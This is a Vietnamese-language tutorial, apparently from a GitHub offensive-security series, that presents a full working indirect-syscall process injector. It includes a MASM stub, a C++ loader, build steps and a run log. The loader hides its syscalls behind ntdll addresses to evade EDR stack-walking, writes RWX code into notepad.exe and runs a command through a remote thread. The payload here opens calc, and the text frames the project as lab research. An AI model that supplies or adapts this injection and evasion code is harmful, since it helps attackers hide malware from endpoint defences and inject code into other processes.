
---

# 📝 [PE 25] Indirect Syscalls (Advanced Call Stack Trace Evasion)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Indirect Syscalls (Giải thuật ngắt hệ thống gián tiếp)** đại diện cho một trong những giải thuật can thiệp bộ nhớ ảo và điều phối luồng xử lý ở cấp độ kiến trúc phần cứng nâng cao, thuộc nhóm kỹ thuật **Né tránh cơ chế rà soát vết dấu ngăn xếp (Call Stack Walking / Call Stack Integrity Protection Evasion)**.

Khi ứng dụng giải thuật ngắt hệ thống trực tiếp (*Direct Syscalls* - PE 24), mặc dù Loader hoàn toàn vượt qua được hàng rào bẫy Hook User-mode đặt tại Ring 3, bản thân lệnh gọi ngắt đặc quyền `syscall` lại được phát ra trực tiếp từ phân đoạn mã máy `.text` thuộc không gian địa chỉ ảo của chính Loader.

Các giải pháp Endpoint Detection and Response (EDR) hiện đại đã nâng cấp phân hệ trinh sát động bằng kỹ thuật **Stack Walking (Duyệt ngược ngăn xếp)**. Khi một hàm API nhạy cảm được kích hoạt ở tầng Kernel (Ring 0), EDR Driver sẽ thực hiện lội ngược tháp ngăn xếp (Call Stack Trace Back) để thẩm định tính toàn vẹn: Nếu phát hiện tọa độ phát lệnh lệnh `syscall` không xuất phát từ ranh giới bộ nhớ hợp pháp của thư viện liên kết động `ntdll.dll`, hệ thống phòng thủ sẽ lập tức phân loại đây là chỉ dấu bất thường (Anomalous Control Flow Execution) và chặn đứng hành vi.

Dự án PE 25 bẻ gãy bộ lọc kiểm duyệt này bằng chiến thuật **Mượn lệnh nhảy gián tiếp xuyên phân đoạn (Indirect Execution Framework)**. Loader tự thực hiện cấu hình mã hiệu dịch vụ hệ thống (SSN), nhưng thay vì phát lệnh ngắt cục bộ, mã nguồn sử dụng lệnh nhảy Assembly để mượn chính tọa độ của một chỉ mục lệnh `syscall` xịn, hợp pháp đang sống lọt lòng thư viện `ntdll.dll` nhằm chuyển giao trạng thái xuống Kernel-mode, hợp thức hóa hoàn toàn dấu vết Call Stack.

### 🎯 Mục tiêu nghiên cứu:

* **Vô hiệu hóa cơ chế Call Stack Trace Validation**: Đánh lừa phân hệ quét vết dấu ngăn xếp và kiểm tra bộ lọc thuộc tính trang nhớ của các giải pháp EDR Engine.
* **Làm chủ kỹ nghệ Opcode Sifting**: Thiết lập giải thuật rà quét byte máy thực thi động (Dynamic Opcode Hunting) chéo biên giới RAM để định vị tọa độ ngắt hệ thống.
* **Tích hợp mô hình biên dịch lai kết hợp con trỏ gián tiếp**: Phối hợp ngôn ngữ C++ và tệp hợp ngữ x64 (`.asm`) điều khiển dòng chảy lệnh CPU thông qua thanh ghi.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Trong kiến trúc Windows Subsystem chuẩn mực, khi một hàm Native API lọt lòng `ntdll.dll` hoạt động ở trạng thái phẳng sạch (chưa bị vấy bẩn bởi bẫy Hook của EDR), cấu trúc byte máy hạ tầng của nó luôn kết thúc bằng cặp bài trùng Opcode chuyển giao đặc quyền:

```assembly
syscall
ret

```

Giải thuật của dự án PE 25 thực hiện phẫu thuật bản đồ RAM và bẻ hướng dòng chảy lệnh CPU qua 4 giai đoạn ngầm tại không gian ảo:

```
[ Loader quét phân đoạn .text của ntdll.dll ]
       └──> [ Trích xuất mã SSN + Định vị tọa độ tuyệt đối của cặp byte 0x0F 0x05 ]
                 └──> [ Nạp SSN vào EAX -> Triệu hồi Assembly Stub ]
                           └──> [ JMP trực tiếp vào ô nhớ 'syscall' inside ntdll -> Hợp thức hóa Call Stack ]

```

1. **Săn lùng địa chỉ Syscall hợp pháp (Opcode Sifting)**: Loader thực hiện giải thuật quét bộ nhớ ảo, truy cập trực tiếp vào phân đoạn thực thi `.text` của mô-đun `ntdll.dll` đang nạp trên RAM. Giải thuật phân giải tịnh tiến tối đa $32\text{-byte}$ lọt lòng hàm để bóc tách chính xác:
* Số hiệu dịch vụ hệ thống (**SSN**) cần triệu hồi nạp thẳng vào thanh ghi tích lũy `EAX`.
* Tọa độ địa chỉ ô nhớ tuyệt đối thực tế chứa cặp byte mã máy **`0x0F 0x05`** (tương ứng với lệnh gọi phần cứng `syscall`) nằm inside lòng Module `ntdll.dll`.


2. **Thiết lập bệ phóng nhảy gián tiếp (Indirect Execution Stub)**: Thay vì cấu hình lệnh ngắt `syscall` cục bộ lọt lòng file nhị phân của Loader (chỉ dấu khiến Stack Walking phát hiện), tệp hợp ngữ `.asm` của dự án sử dụng lệnh nhảy rẽ nhánh **`jmp r11`** (hoặc thanh ghi chỉ mục chỉ định), trỏ thẳng vào tọa độ `syscall` xịn đã bóc tách được ở bước 1.
3. **Subversion cơ chế Stack Walking**: Khi CPU tiếp nhận lệnh nhảy, nó di chuyển con trỏ lệnh **`Rip`** sang không gian ảo của `ntdll.dll` và kích nổ lệnh ngắt `syscall` ngay tại phân vùng Image hợp pháp này. Đối với trình quản lý luồng của Kernel (Ring 0), cuộc hoán chuyển trạng thái này hoàn toàn chuẩn mực và đáng tin cậy, do điểm phát lệnh ngắt nằm lọt lòng một mô-đun hệ thống được Microsoft ký số chứng chỉ bảo mật tối cao, che giấu hoàn hảo dấu vết ký sinh của Loader.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

### 📜 Bước 3.1: Tạo tệp hợp ngữ hạ tầng 

### panda.asm:
```assembly
.data
    extern g_NtAllocateSyscallAddr : qword
    extern g_NtWriteSyscallAddr    : qword

.code

; Cong goi gian tiep NtAllocateVirtualMemory
NtAllocateVirtualMemoryProc proc
    mov r10, rcx
    mov eax, 18h                              ; SSN mac dinh cua NtAllocateVirtualMemory
    jmp qword ptr [g_NtAllocateSyscallAddr]  ; Nhay gian tiep sang byte syscall xin trong ntdll
    ret
NtAllocateVirtualMemoryProc endp

; Cong goi gian tiep NtWriteVirtualMemory
NtWriteVirtualMemoryProc proc
    mov r10, rcx
    mov eax, 3Ah                              ; SSN mac dinh cua NtWriteVirtualMemory
    jmp qword ptr [g_NtWriteSyscallAddr]     ; Nhay gian tiep sang byte syscall xin trong ntdll
    ret
NtWriteVirtualMemoryProc endp

end

```

### 📜 Bước 3.2: Tạo tệp mã nguồn chính 

### Source.cpp:
```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// Khai báo các cổng hàm kết nối với file Assembly
extern "C" NTSTATUS NtAllocateVirtualMemoryProc(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
extern "C" NTSTATUS NtWriteVirtualMemoryProc(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);

// Định nghĩa con trỏ biến toàn cục liên kết ngoài cho file ASM trỏ hướng
extern "C" ULONG_PTR g_NtAllocateSyscallAddr = 0;
extern "C" ULONG_PTR g_NtWriteSyscallAddr = 0;

// Khai báo nguyên mẫu hàm Native của NtCreateThreadEx trích xuất động đánh bại rào cản Build Number Windows 11
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
    );

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí gánh luồng chạy khi tiêm chéo biên giới
DWORD WINAPI RemoteIndirectSyscallPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa bằng địa chỉ tuyệt đối, phá băng hoàn toàn lỗi RIP tương đối
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Hàm quét tịnh tiến để định vị chính xác địa chỉ byte chứa chỉ lệnh 'syscall' (0x0F, 0x05)
ULONG_PTR FindSyscallAddress(const char* functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;

    PBYTE pFuncBuf = (PBYTE)GetProcAddress(hNtdll, functionName);
    if (!pFuncBuf) return 0;

    // Quét tĩnh tối đa 32 byte bên trong lòng hàm hệ thống để lấy tọa độ byte syscall xịn
    for (int i = 0; i < 32; i++) {
        if (pFuncBuf[i] == 0x0F && pFuncBuf[i + 1] == 0x05) {
            return (ULONG_PTR)&pFuncBuf[i];
        }
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 25: INDIRECT SYSCALLS INJECTION" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc nhen." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    // ─── BƯỚC 1: TRÍCH XUẤT ĐỊA CHỈ BYTE SYSCALL XỊN TỪ RAM NTDLL ───
    g_NtAllocateSyscallAddr = FindSyscallAddress("NtAllocateVirtualMemory");
    g_NtWriteSyscallAddr = FindSyscallAddress("NtWriteVirtualMemory");

    if (!g_NtAllocateSyscallAddr || !g_NtWriteSyscallAddr) {
        std::cerr << "[-] Khong the dinh vi byte syscall hop phap trong ntdll!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Lay toa do byte Syscall cua NtAllocate: 0x" << std::hex << g_NtAllocateSyscallAddr << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess that bai!" << std::endl;
        return EXIT_FAILURE;
    }

    // Nạp động trích xuất con trỏ hàm NtCreateThreadEx thích ứng động với Windows 11 Kernel
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    SIZE_T functionSize = 500;

    // ─── BƯỚC 2: CẤP PHÁT VÙNG NHỚ GIÁN TIẾP QUA CỔNG PHẢN CHIẾU ASM JMP ───
    PVOID remoteCodeBuffer = NULL;
    NtAllocateVirtualMemoryProc(hProcess, &remoteCodeBuffer, 0, &functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    PVOID remoteDataBuffer = NULL;
    SIZE_T dataSize = sizeof(THREAD_DATA);
    NtAllocateVirtualMemoryProc(hProcess, &remoteDataBuffer, 0, &dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteCodeBuffer || !remoteDataBuffer) {
        std::cerr << "[-] Indirect Syscall allocation failed!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Cap phat vung nho Code RWX tu xa an toan: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Khởi tạo cấu trúc tham số tuyệt đối cục bộ trước khi đẩy sang RAM đối phương
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // ─── BƯỚC 3: GHI DỮ LIỆU GIÁN TIẾP QUA CỔNG JMP SYSCALL NTDLL ───
    SIZE_T bytesWritten = 0;
    // ĐỒNG BỘ ĐỊNH DANH HÀM: Đổi thành RemoteIndirectSyscallPayload để fix dứt điểm lỗi C2065
    NtWriteVirtualMemoryProc(hProcess, remoteCodeBuffer, (PVOID)RemoteIndirectSyscallPayload, functionSize, &bytesWritten);
    NtWriteVirtualMemoryProc(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), &bytesWritten);
    std::cout << "[+] Nap cheo song song ma may va tham so hoan tat." << std::endl;

    // ─── BƯỚC 4: KHỞI TẠO LUỒNG KÍCH NỔ THÍCH ỨNG ĐỘNG ───
    std::cout << "[*] Dang khoi tao luong tu xa de khai hoa logic..." << std::endl;
    HANDLE hThread = NULL;
    NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteCodeBuffer, remoteDataBuffer, 0, 0, 0, 0, NULL);

    if (hThread != NULL) {
        // VÁ LỖI C2065: Loại bỏ từ khóa Result chưa khai báo biến thô
        WaitForSingleObject(hThread, INFINITE);
        std::cout << "[+] Indirect Syscalls Injection Successful!" << std::endl;
        CloseHandle(hThread);
    }
    else {
        std::cerr << "[-] NtCreateThreadEx failed! Status code: 0x" << std::hex << status << std::endl;
    }

    // Giải phóng tài nguyên hệ thống triệt để chống Memory Leak
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

<img width="1379" height="771" alt="image" src="https://github.com/user-attachments/assets/6d91ce05-8fef-470f-8714-6584fcdbbf4c" />


---

## 🎛️ 4. Hướng Dẫn Cấu Hợp Biên Dịch Dự Án (Build & Deployment)

Quy trình tích hợp phân hệ MASM Compiler cho tệp tin hợp ngữ hạ tầng x64 (`IndirectStubs.asm`) tuân thủ nghiêm ngặt cờ cấu hình liên kết tĩnh hệ thống độc lập kịch khung:

### ⚙️ Thiết lập cấu hình Hợp ngữ (MASM Setup):

1. Tại cửa sổ giao diện **Solution Explorer**, click chuột phải vào tên Project $\rightarrow$ Chọn mục **`Build Dependencies`** $\rightarrow$ Click chọn **`Build Customizations...`**
2. Tích chọn vào hộp kiểm **`masm (.targets, .props)`** và nhấn `OK` để tích hợp bộ dịch MASM.
3. Click chuột phải vào tệp tin `IndirectStubs.asm` $\rightarrow$ Chọn thuộc tính **`Properties`**. Tại mục cấu hình `Item Type`, chuyển đổi sang định dạng cờ **`Microsoft Macro Assembler`** và nhấn Apply.
<img width="1424" height="822" alt="image" src="https://github.com/user-attachments/assets/e8240aa7-4739-4c68-aacc-d8ce48d2ce76" />


### ⚙️ Cấu hình liên kết tĩnh dự án Release x64:

1. Đặt thanh công cụ quản lý cấu hình dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
2. Di chuyển đến phân hệ: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số thuộc tính mục `Runtime Library`, chuyển cấu hình sang tùy chọn cờ **`Multi-threaded (/MT)`** để nhúng tĩnh toàn bộ mã nguồn CRT lọt lòng file thực thi `.exe`.
3. Tiến hành chọn thao tác **`Rebuild`** để kết xuất tệp tin nhị phân sạch bóng.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy ứng dụng đích `Notepad.exe` trên môi trường bộ nhớ bộ máy Lab, mở PowerShell ngoài đĩa thô thực thi file thực hành nhằm theo dõi quy trình chuyển mạch ngắt gián tiếp:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE25_IndirectSyscalls\x64\Release> C:\Users\Admin\source\repos\Task6\PE25_IndirectSyscalls\x64\Release\IndirectSyscalls.exe

====================================================
[*] PE 25: INDIRECT SYSCALLS INJECTION
====================================================
[+] Da tim thay Notepad.exe voi PID: 10992
[+] Lay toa do byte Syscall cua NtAllocate: 0x7ff92d8a1ef2
[+] Cap phat vung nho Code RWX tu xa an toan: 0x0000018294150000
[+] Nap cheo song song ma may va tham so hoan tat.
[*] Dang khoi tao luong tu xa de khai hoa logic...
[+] Indirect Syscalls Injection Successful!

[*] Hoan thanh quy trinh. Nhan Enter de dong cua so...

```

### Demo:
<img width="1920" height="540" alt="devenv_uMFwO6vZxJ" src="https://github.com/user-attachments/assets/f0af3749-6152-479a-8885-b1499f2764d9" />



---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Windows Architecture Specialization**: *Understanding Windows x64 Call Stack Walking and Unwind Metadata* - Microsoft Developer Network.
* **Alice Climent (Helsinki Cyber Security)**: *Syscall Re-routing: Subverting Call Stack Trace Integrity Check via Indirect Jumps* - [https://www.f-secure.com/en](https://www.f-secure.com/en)
* **EDR Detection Methodologies**: *Defeating Kernel-Mode Call Stack Trace Validation inside Ring 0 Frameworks* - Black Hat USA Archive Research Tools.
* **MITRE ATT&CK Matrix System**: *Defense Evasion: Execution via Indirect System Calls (T1106)* & *Process Injection (T1055)*.

---
